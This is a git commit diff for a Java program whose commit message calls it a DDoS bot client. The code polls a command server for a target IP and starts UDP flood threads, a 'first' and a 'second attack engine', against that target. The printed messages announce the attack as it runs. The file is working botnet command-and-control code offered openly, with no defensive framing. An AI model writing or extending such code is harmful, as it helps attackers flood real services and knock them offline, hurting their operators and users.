cd092705ed5983b3bef2714723cd9ce1094408b8
zhanying233 <zhanyingwl@gmail.com>
2021-11-10 16:31:22 +0800

    DDoS被控端

--- src/com/zhanyingwl/www/doConnect.java
+++ src/com/zhanyingwl/www/doConnect.java
@@ -11,13 +11,14 @@ import java.net.Socket;
  * @ClassName : doConnect
  * @Description : 启动类
  * @Author : 战鹰
- * @Version: 1.0
+ * @Version: 2.0
  */
 
 public class doConnect {
     static String ServerName = "localhost";
     static int ServerPort = 8090;
-    static String getTargetHost;
+    static String onegetTargetHost;
+    static String twogetTargetHost;
 
     public static void main(String[] args) {
         while (true) {
@@ -31,22 +32,33 @@ public class doConnect {
                         Thread.sleep(1000);
                         InputStream is = socket.getInputStream();
                         BufferedReader br = new BufferedReader(new InputStreamReader(is));
-                        getTargetHost = br.readLine();
-                        switch (getTargetHost) {
+                        onegetTargetHost = br.readLine();
+                        switch (onegetTargetHost) {
                             case "none":
                                 System.out.println("没啥事儿！");
                                 System.out.println("GO！");
                                 System.out.println("--------------------------------------");
                                 break;
-                            default:
-                                System.out.println("客户端接收到目标IP：" + getTargetHost);
-                                UdpSend udpSend = new UdpSend();
-                                udpSend.start();
+                            case "":
+                                twoUdpSend udpSend2 = new twoUdpSend();
+                                udpSend2.start();
                                 for (int i = 0; i < 10; i++) {
                                     Thread.sleep(1000);
-                                    System.out.println("执行攻击中。。。");
+                                    System.out.println("使用第二攻击引擎执行UDP攻击中。。。");
                                 }
-                                udpSend.interrupt();
+                                udpSend2.interrupt();
+                                break;
+                            default:
+                                System.out.println("客户端接收到目标IP：" + onegetTargetHost);
+                                twogetTargetHost = onegetTargetHost;
+                                System.out.println("已将目标IP载入第二攻击引擎！第二攻击引擎目标IP：" + twogetTargetHost);
+                                oneUdpSend udpSend1 = new oneUdpSend();
+                                udpSend1.start();
+                                for (int i = 0; i < 10; i++) {
+                                    Thread.sleep(1000);
+                                    System.out.println("使用第一攻击引擎执行UDP攻击中。。。");
+                                }
+                                udpSend1.interrupt();
                         }
                     }
                 } else {
@@ -54,6 +66,7 @@ public class doConnect {
                 }
             } catch (InterruptedException | IOException e) {
                 e.printStackTrace();
+                System.out.println("系统错误！");
             }
         }
     }
